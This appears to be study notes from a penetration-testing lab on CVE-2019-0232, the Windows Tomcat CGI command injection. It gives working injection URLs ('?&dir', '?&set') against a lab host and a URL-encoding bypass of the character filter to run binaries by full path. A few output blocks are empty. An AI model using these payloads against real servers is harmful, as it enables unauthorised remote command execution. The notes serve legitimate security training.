# Attacking Tomcat CGI

## CVE-2019-0232 — Overview

**Type:** Critical **OS command injection → RCE**
**Platform:** **Windows only**, requires `enableCmdLineArguments` to be enabled
**Affected versions:**
| Branch | Range |
|---|---|
| 9.x | 9.0.0.M1 – 9.0.17 |
| 8.5.x | 8.5.0 – 8.5.39 |
| 7.x | 7.0.0 – 7.0.93 |

**Root cause:** Input validation flaw in the **Tomcat CGI Servlet** when parsing query strings into command-line arguments.

---

## Background: CGI Servlet & enableCmdLineArguments

### What the CGI Servlet Does
- Middleware allowing Tomcat to communicate with **external CGI scripts** (Perl, Python, Bash, batch, etc.)
- Receives browser requests → forwards to CGI scripts for processing

**Advantages vs Disadvantages:**
| Advantages | Disadvantages |
|---|---|
| Simple for generating dynamic content | Overhead — loads a program per request |
| Language-agnostic (stdin/stdout) | Can't easily cache data between requests |
| Reuses existing code | Reduces server performance / consumes processing time |

### enableCmdLineArguments Setting
- Controls whether the **query string** is parsed into **command-line arguments** passed to the CGI script
- Enables flexible scripts, e.g.:
```
http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby
```
- **The vulnerability:** On Windows, when this is enabled, the Servlet **fails to properly sanitize** browser input before passing it to the script
- Attackers can inject OS commands using the batch separator **`&`**:
```
http://example.com/cgi-bin/hello.bat?&dir
```
→ Executes `dir` on the server alongside the intended script call

### 2. Finding the CGI Script Path
Default CGI directory: **`/cgi`**

**Fuzz for .cmd extension (unsuccessful):**
```

```

**Fuzz for .bat extension (successful):**
```
junior-security-analyst@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```
Result:

**Confirm the script exists:**
```
http://10.129.204.227:8080/cgi/welcome.bat
→ "Welcome to CGI, this section is not functional yet. Please return to home page."
```

> **Tip:** Since target OS is Windows, prioritize fuzzing for `.bat`/`.cmd` extensions over Unix-style scripts.

## Exploitation

### Step 1: Basic Command Injection
Append commands using `&` separator:
```
http://10.129.204.227:8080/cgi/welcome.bat?&dir
```
→ Returns `dir` output successfully

**Note:** Other common commands (e.g., `whoami`) may **not** work directly — environment issues likely (see below).

### Step 2: Enumerate Environment Variables
```
http://10.129.204.227:8080/cgi/welcome.bat?&set
```
Reveals key info, notably:
```
COMSPEC=C:\Windows\system32\cmd.exe
SCRIPT_FILENAME=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
SystemRoot=C:\Windows
```
- **Critical finding:** the **PATH variable is unset** — explains why bare commands like `whoami` fail
- **Fix:** use **hardcoded full paths** to binaries

### Step 3: Hardcoded Path Attempt (Blocked by Filter)
```
http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
```
→ **Fails** — Tomcat's patch uses a **regex filter** to block special characters (like `:` and `\`) in the query string

### Step 4: Bypass via URL Encoding
```
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```
- URL-encoding `:` (`%3A`) and `\` (`%5C`) **bypasses the regex filter**
- Confirms exploitation path to full command execution with hardcoded binary paths

---

## Key Takeaways
- **CVE-2019-0232** is Windows-only and requires `enableCmdLineArguments=true` — a non-default but occasionally-enabled CGI setting
- Discovery relies on **fuzzing `/cgi/` for `.bat`/`.cmd` files** — the vulnerable entry point won't be obvious without this
- The `&` separator is the injection mechanism; always check `?&set` first to understand the environment (especially **PATH**)
- If PATH is unset, **use full hardcoded binary paths**
- If Tomcat's **character-filtering patch** blocks special characters, **URL-encode** the payload (`:` → `%3A`, `\` → `%5C`) to bypass it
- As with all CGI/webshell-style findings: document the exact payload, encoded and decoded, path used, and clean up any artifacts created during testing
